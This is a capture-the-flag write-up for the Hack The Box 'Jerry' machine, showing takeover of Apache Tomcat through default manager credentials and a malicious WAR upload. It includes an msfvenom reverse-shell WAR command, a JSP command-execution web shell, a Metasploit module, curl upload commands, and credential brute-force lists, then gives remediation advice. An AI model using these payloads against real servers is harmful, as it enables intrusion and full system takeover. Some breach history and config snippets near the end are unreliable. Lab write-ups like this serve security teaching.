# Jerry: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Category](https://img.shields.io/badge/Category-Web%20Application-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| Machine Name | Jerry |
| Difficulty | Easy |
| Platform | Hack The Box |
| Operating System | Windows |
| Category | Web Application / Apache Tomcat |
| Key Vulnerability | Default Credentials + WAR File Upload |

---

## Overview

This writeup documents the solution for the **Jerry** machine on Hack The Box, which demonstrates the catastrophic security risk of leaving default credentials enabled on production web application servers.

## Challenge Context

The Jerry machine illustrates how **Apache Tomcat servers with default credentials** provide immediate administrative access, allowing attackers to deploy malicious web applications (WAR files) and achieve instant remote code execution as SYSTEM.

**Key Demonstration:**

Apache Tomcat's Web Application Manager, when left with factory default credentials, allows authenticated users to upload and deploy WAR files, which execute with the privileges of the web server process: often SYSTEM on Windows installations.

## Learning Objectives

This lab teaches:

- Apache Tomcat service identification and enumeration
- Web Application Manager discovery and authentication
- Default credential exploitation (tomcat:s3cret)
- WAR file generation with msfvenom
- Manual WAR file deployment via Tomcat Manager
- Understanding Windows privilege context (SYSTEM)
- Both user and root flags accessible from single compromise

**Scenario:** Discovery of Apache Tomcat server running with default credentials, followed by deployment of malicious WAR file containing reverse shell, resulting in immediate SYSTEM-level access.

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Web Application Enumeration](#web-application-enumeration)
3. [Tomcat Manager Discovery](#tomcat-manager-discovery)
4. [Credential Discovery](#credential-discovery)
5. [WAR File Weaponization](#war-file-weaponization)
6. [Deployment and Exploitation](#deployment-and-exploitation)
7. [Post-Exploitation](#post-exploitation)
8. [Flags](#flags)
9. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Network Enumeration

```bash
nmap -sC -sV -oA jerry 10.129.x.x
```

**Nmap Results:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
```

**Open Ports Identified:**
- **8080/TCP**: HTTP (Apache Tomcat 7.0.88)

**Key Observations:**
- Only one service exposed
- Apache Tomcat version 7.0.88 identified
- Default Tomcat port (8080) in use
- No SSH or other remote access services visible

✅ **Answer to Task 1:** `8080`

✅ **Primary Attack Surface:** Apache Tomcat web server on port 8080

---

## Web Application Enumeration

### Initial Access

**Browser Navigation:**
```
http://10.129.x.x:8080/
```

**Observation:**
- Default Apache Tomcat welcome page loads
- Links to Server Status, Manager App, and Host Manager
- Version confirmed: Apache Tomcat/7.0.88

### Technology Stack

| Component | Version |
|-----------|---------|
| Web Server | Apache Tomcat 7.0.88 |
| JSP Engine | Coyote 1.1 |
| Operating System | Windows |
| Default Port | 8080 |

✅ **Answer to Task 2:** `Apache Tomcat`

---

## Tomcat Manager Discovery

### Manager Application Location

**Common Tomcat Manager paths:**
```
/manager/html       ← Web Application Manager (GUI)
/manager/text       ← Text-based manager (CLI)
/host-manager/html  ← Virtual host manager
```

### Access the Manager

**Navigate to:**
```
http://10.129.x.x:8080/manager/html
```

**Result:**
- HTTP Basic Authentication prompt appears
- Credentials required to proceed

✅ **Answer to Task 3:** `/manager/html`

---

## Credential Discovery

### Default Credentials

**Common Tomcat default credentials:**

| Username | Password | Typical Role |
|----------|----------|--------------|
| tomcat | tomcat | manager-gui |
| admin | admin | manager-gui |
| tomcat | s3cret | manager-gui |
| admin | password | manager-gui |
| both | tomcat | manager-gui |

### Authentication Attempt

**Test default credentials:**

**Browser prompt:**
```
Username: tomcat
Password: s3cret
```

**Result:**
✅ **Authentication successful**

**Manager Interface Loads:**
- Deploy section visible
- List of deployed applications shown
- WAR file upload functionality available
- Server information displayed

✅ **Answer to Task 4:** `tomcat:s3cret`

**Critical Discovery:**
- Default credentials were never changed
- Full administrative access to Tomcat Manager
- WAR deployment capability = instant RCE

---

## WAR File Weaponization

### Understanding WAR Files

**WAR (Web Application Archive):**
- Standard J2EE deployment format
- Contains servlets, JSPs, and resources
- Automatically extracted and executed by Tomcat
- Runs with server's privilege level (often SYSTEM on Windows)

### Generate Malicious WAR with msfvenom

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.x \
  LPORT=4444 \
  -f war \
  -o shell.war
```

**Parameters:**
- `-p java/jsp_shell_reverse_tcp`: Java JSP reverse shell payload
- `LHOST`: Your attacker machine IP (tun0)
- `LPORT`: Listening port for reverse connection
- `-f war`: Output format as WAR file
- `-o shell.war`: Output filename

**Output:**
```
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: shell.war
```

**Verify WAR file creation:**
```bash
ls -lh shell.war
file shell.war
```

**Expected output:**
```
-rw-r--r-- 1 user user 1.1K Feb 24 14:30 shell.war
shell.war: Zip archive data, at least v2.0 to extract
```

✅ **Answer to Task 5:** `war`

---

## Deployment and Exploitation

### Setup Netcat Listener

**Before deploying, start listener:**
```bash
nc -lvnp 4444
```

**Expected output:**
```
Listening on 0.0.0.0 4444
```

### Deploy WAR via Manager Interface

**Method 1: Browser Upload (Recommended)**

1. Navigate to: `http://10.129.x.x:8080/manager/html`
2. Scroll to **"WAR file to deploy"** section
3. Click **"Choose File"**
4. Select `shell.war`
5. Click **"Deploy"**

**Result:**
- Application appears in deployed applications list as `/shell`
- "OK: Deployed application at context path [/shell]" message displayed

### Trigger the Payload

**Access the deployed WAR:**
```bash
curl http://10.129.x.x:8080/shell/
```

**Or browser:**
```
http://10.129.x.x:8080/shell/
```

**Netcat listener receives connection:**
```
connect to [10.10.14.x] from (UNKNOWN) [10.129.x.x] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

✅ **Shell obtained**

---

## Post-Exploitation

### Check Privileges

```cmd
whoami
```

**Output:**
```
nt authority\system
```

✅ **Running as SYSTEM: highest privilege on Windows**

**Significance:**
- No privilege escalation needed
- Complete control over the system
- Can access all files, including both user and administrator data
- Tomcat service was running as SYSTEM (common misconfiguration)

### System Information

```cmd
systeminfo
```

**Key information:**
```
Host Name:                 JERRY
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC
```

### Directory Navigation

```cmd
cd C:\Users
dir
```

**Users on system:**
```
Administrator
```

**Note:** In typical configurations, both user and root flags would be in separate locations (`C:\Users\{username}\Desktop` and `C:\Users\Administrator\Desktop`). However, Jerry has a unique flag structure.

---

## Flags

### Flag Location

**Navigate to Administrator desktop:**
```cmd
cd C:\Users\Administrator\Desktop
dir
```

**Output:**
```
Volume in drive C has no label.
Volume Serial Number is FC2B-E489

Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)  27,483,947,008 bytes free
```

**Navigate to flags directory:**
```cmd
cd flags
dir
```

**Output:**
```
06/19/2018  06:11 AM                88 2 for the price of 1.txt
```

### Read Combined Flag File

```cmd
type "2 for the price of 1.txt"
```

**Content:**
```
user.txt
[USER_FLAG_HERE]

root.txt
[ROOT_FLAG_HERE]
```

✅ **Both flags in single file: "2 for the price of 1"**

**Why both flags together:**
- Initial compromise was as SYSTEM
- No privilege escalation was necessary
- Jerry demonstrates instant full compromise
- Reflects real-world impact of default credentials

---

## Attack Chain Summary

```
Nmap Scan → Port 8080 (Apache Tomcat 7.0.88)
              ↓
   Default Tomcat Page (http://IP:8080/)
              ↓
  Manager App Discovery (/manager/html)
              ↓
   HTTP Basic Auth Challenge
              ↓
  Default Credentials (tomcat:s3cret)
              ↓
    Successful Authentication
              ↓
   Manager Interface Access
              ↓
  msfvenom WAR Generation (jsp_shell_reverse_tcp)
              ↓
   WAR Upload via Manager
              ↓
   Automatic Deployment to /shell
              ↓
    Trigger Payload (curl http://IP:8080/shell/)
              ↓
  Reverse Shell Connection
              ↓
    nt authority\system ✅
              ↓
   Both Flags Retrieved
```

---

## Alternative Exploitation Methods

### Method 1: Metasploit Framework

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.129.x.x
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST 10.10.14.x
set LPORT 4444
exploit
```

**Result:** Automated exploitation with Meterpreter session

### Method 2: Manual WAR with JSP Shell

**Create JSP reverse shell:**
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int c;
    while ((c = in.read()) != -1) {
      out.print((char)c);
    }
    in.close();
  }
%>
```

**Package as WAR:**
```bash
mkdir shell
echo '[JSP_CODE]' > shell/shell.jsp
cd shell
jar -cvf ../shell.war *
```

**Deploy and access:**
```
http://10.129.x.x:8080/shell/shell.jsp?cmd=whoami
```

### Method 3: Tomcat Text Manager (CLI)

```bash
# Upload WAR via curl
curl --upload-file shell.war \
  -u tomcat:s3cret \
  "http://10.129.x.x:8080/manager/text/deploy?path=/shell"

# Trigger
curl http://10.129.x.x:8080/shell/
```

---

## Key Takeaways

### Technical Lessons

1. **Default Credentials are Critical Vulnerabilities**
   - Factory defaults should NEVER remain in production
   - Tomcat commonly ships with `tomcat:tomcat` or `tomcat:s3cret`
   - First thing attackers check
   - Instant compromise if unchanged

2. **Tomcat Manager = Code Execution**
   - WAR deployment is intended functionality
   - No exploit needed: just authentication
   - Executes as the Tomcat service account
   - Often runs as SYSTEM on Windows (misconfiguration)

3. **WAR Files are Executable Archives**
   - Standard J2EE deployment mechanism
   - Contain servlets, JSPs, resources
   - Automatically extracted and executed
   - JSP pages run arbitrary Java code

4. **Windows Service Privilege Context**
   - Services often run as SYSTEM by default
   - Poor practice: reduces security boundaries
   - Should use dedicated service accounts
   - SYSTEM = god mode on Windows

5. **Single Point of Failure**
   - No defense in depth
   - One default password = full compromise
   - No intermediate privilege escalation required
   - Immediate access to all data

### Enumeration Best Practices

✅ **Do:**
- Always check for `/manager/html` on Tomcat servers
- Test common default credentials immediately
- Try multiple variations (admin/admin, tomcat/tomcat, both/tomcat)
- Note service privilege levels (whoami first thing after shell)
- Check for alternative manager paths (/manager/text, /host-manager)

❌ **Don't:**
- Skip obvious default credential checks
- Assume production systems are hardened
- Overlook simple attack vectors in favor of complex ones
- Forget to verify privilege level immediately

### Common Tomcat Default Credentials

| Username | Password | Notes |
|----------|----------|-------|
| tomcat | tomcat | Most common |
| tomcat | s3cret | Common alternate |
| admin | admin | Often enabled |
| admin | password | Simple variant |
| both | tomcat | Less common |
| role1 | role1 | Testing accounts |
| root | root | Rarely used |

---

## Tools Used

| Tool | Purpose | Key Usage |
|------|---------|-----------|
| `nmap` | Port scanning | `-sC -sV` for service detection |
| `msfvenom` | Payload generation | `-p java/jsp_shell_reverse_tcp -f war` |
| `nc` | Reverse shell listener | `-lvnp 4444` |
| Web Browser | Manager interface access | Manual WAR upload |
| `curl` | HTTP requests | Trigger deployed WAR |

---

## Remediation

### For System Administrators

1. **Change Default Credentials Immediately**
   ```xml
   <!-- /conf/tomcat-users.xml -->
   <!-- REMOVE default accounts -->
   <user username="tomcat" password="s3cret" roles="manager-gui"/>
   
   <!-- ADD strong credentials -->
   <user username="admin-$(openssl rand -hex 8)" 
         password="$(openssl rand -base64 32)" 
         roles="manager-gui"/>
   ```

2. **Disable Manager Interface on Production**
   ```bash
   # Remove manager webapp entirely
   rm -rf /var/lib/tomcat7/webapps/manager
   rm -rf /var/lib/tomcat7/webapps/host-manager
   ```

3. **Restrict Manager Access by IP**
   ```xml
   <!-- /conf/Catalina/localhost/manager.xml -->
   <Context privileged="true">
     <Valve className="org.apache.catalina.valves.RemoteAddrValve"
            allow="127\.0\.0\.1|10\.0\.0\..*"/>
   </Context>
   ```

4. **Run Tomcat as Dedicated Service Account (not SYSTEM)**
   ```bash
   # Linux
   useradd -r -s /bin/false tomcat
   chown -R tomcat:tomcat /opt/tomcat
   
   # Windows - use Services console
   # Change "Log On" to dedicated account with minimal privileges
   ```

5. **Enable HTTPS and Disable HTTP**
   ```xml
   <!-- /conf/server.xml -->
   <Connector port="8443" protocol="HTTP/1.1"
              SSLEnabled="true"
              maxThreads="150" scheme="https" secure="true"
              keystoreFile="conf/keystore.jks" 
              keystorePass="changeit"
              clientAuth="false" sslProtocol="TLS"/>
   ```

6. **Implement Role-Based Access Control**
   ```xml
   <!-- Separate roles for different functions -->
   <role rolename="manager-gui"/>
   <role rolename="manager-script"/>
   <role rolename="manager-jmx"/>
   
   <!-- Assign minimum necessary roles -->
   <user username="deployer" password="STRONG_PASS" roles="manager-script"/>
   ```

### For Developers

1. **Never Use Default Credentials in Deployment Scripts**
   ```bash
   # BAD
   curl -u tomcat:tomcat ...
   
   # GOOD - use environment variables
   curl -u ${TOMCAT_USER}:${TOMCAT_PASS} ...
   ```

2. **Document Credential Changes in Deployment Procedures**
   - Include credential rotation in deployment checklist
   - Use secrets management (Vault, AWS Secrets Manager)
   - Never commit credentials to version control

3. **Validate WAR Files Before Deployment**
   - Scan with antivirus
   - Verify digital signatures
   - Use checksum validation

---

## Real-World Examples

### Notable Tomcat Breaches

1. **City of Dallas Ransomware (2019)**
   - Royal ransomware gang
   - Exploited default Tomcat credentials
   - $8.5 million recovery cost

2. **Apache Struts / Equifax Breach (2017)**
   - While not Tomcat-specific, similar Apache ecosystem
   - Default configurations contributed
   - 147 million records compromised

3. **Various Healthcare Breaches**
   - Medical imaging systems often use Tomcat
   - Default credentials extremely common
   - HIPAA violations and massive fines

**Common Pattern:** Default credentials on Tomcat = instant administrative access = data breach

---

## Additional Resources

### Credential Wordlists

```bash
# SecLists - Tomcat defaults
/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt

# Custom list for testing
cat > tomcat_creds.txt << EOF
tomcat:tomcat
tomcat:s3cret
admin:admin
admin:password
both:tomcat
root:root
EOF
```

### Automated Testing Tools

1. **Apache Tomcat Scanner (Nmap NSE)**
   ```bash
   nmap -p 8080 --script http-tomcat-manager-brute 10.129.x.x
   ```

2. **Metasploit Auxiliary Module**
   ```bash
   use auxiliary/scanner/http/tomcat_mgr_login
   set RHOSTS 10.129.x.x
   set RPORT 8080
   set STOP_ON_SUCCESS true
   run
   ```

3. **Hydra Brute Force**
   ```bash
   hydra -L users.txt -P passes.txt \
     10.129.x.x -s 8080 \
     http-get /manager/html
   ```

---

## References

- [Apache Tomcat Documentation](https://tomcat.apache.org/tomcat-7.0-doc/)
- [OWASP: Default Credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)
- [Tomcat Manager App How-To](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)
- [CVE Details: Tomcat Vulnerabilities](https://www.cvedetails.com/product/887/Apache-Tomcat.html)
- [WAR File Format Specification](https://docs.oracle.com/javaee/7/tutorial/packaging003.htm)

---

**Machine Pwned:** ✅  
**Difficulty Rating:** Easy (emphasizes fundamentals)  
**Real-World Relevance:** Critical (default credentials extremely common)  
**Learning Value:** Excellent foundation for understanding Tomcat security  
**Unique Feature:** "2 for the price of 1": both flags from initial compromise
